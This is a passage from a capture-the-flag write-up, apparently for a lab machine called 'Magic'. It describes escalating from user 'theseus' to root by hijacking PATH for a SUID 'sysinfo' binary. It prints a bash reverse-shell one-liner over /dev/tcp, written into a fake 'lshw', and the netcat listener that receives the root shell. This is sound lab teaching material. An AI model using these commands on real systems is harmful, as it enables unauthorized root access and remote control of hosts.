</span></span></code></pre></div><p>Now I can log in via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «magic» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ ssh -i  theseus@10.10.10.185
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">theseus@ubuntu:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>theseus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>theseus<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>100<span class="o">(</span>users<span class="o">)</span>,1000<span class="o">(</span>theseus<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem to be a common SUID on Ubuntu called <code>sysinfo</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:~$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span></span></code></pre></div><img src="imgs/image-20210413153352652.png" alt="image-20210413153352652" style="zoom: 67%;" />
<p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and <code>theseus</code> is a member of that group.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:~$ ls -las /bin <span class="p">|</span> grep sysinfo
</span></span><span class="line"><span class="cl"> <span class="m">24</span> -rwsr-x--- <span class="m">1</span> root users <span class="m">22040</span> Oct <span class="m">21</span> <span class="m">2019</span> sysinfo
</span></span></code></pre></div><p>When I execute the binary and it returns some hardware information on the screen that looks similar to what <code>lshw</code>, <code>free</code> and other binary related to hardware info produces.</p>
<img src="imgs/image-20210413153311827.png" alt="image-20210413153311827" style="zoom:80%;" />
<p>A quick search on Google shows:</p>
<img src="imgs/image-20210413153328164.png" alt="image-20210413153328164" style="zoom:80%;" />
<p>So it is the same header.</p>
<p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p>
<ul>
<li>Absolute path: <code>/bin/sysinfo</code> &ndash;&gt; fixed path, can not be modified except global write access is permitted. (cmiiw)</li>
<li>Relative path: <code>sysinfo</code> &ndash;&gt; resolved by user&rsquo;s environment, the path follows user&rsquo;s <code>$PWD</code>.</li>
</ul>
<h4 id="path-hijack-on-suid">Path Hijack on SUID</h4>
<p>Knowing the SUID binary uses relative path to call other binaries, I can abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p>
<p>First thing to do is, I will create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and append one liner bash reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:/tmp$ mkdir iamf
</span></span><span class="line"><span class="cl">theseus@ubuntu:/tmp$ which lshw
</span></span><span class="line"><span class="cl">/bin/lshw
</span></span></code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to the environment variable <code>$PATH</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:/tmp$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
</span></span><span class="line"><span class="cl">theseus@ubuntu:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp/iamf:<span class="nv">$PATH</span>
</span></span></code></pre></div><p>Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:/tmp$ which lshw
</span></span><span class="line"><span class="cl">/tmp/iamf/lshw
</span></span></code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary. However, it then just hangs.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">theseus@ubuntu:/tmp$ <span class="nv">sysinfo</span>
</span></span><span class="line"><span class="cl"><span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
</span></span></code></pre></div><p>That is because its execution is interrupted by the reverse shell and now I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «magic» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">1234</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">36094</span>
</span></span><span class="line"><span class="cl">root@ubuntu:/tmp/iamf# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,100<span class="o">(</span>users<span class="o">)</span>,1000<span class="o">(</span>theseus<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210413152136238.png" alt="image-20210413152136238"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
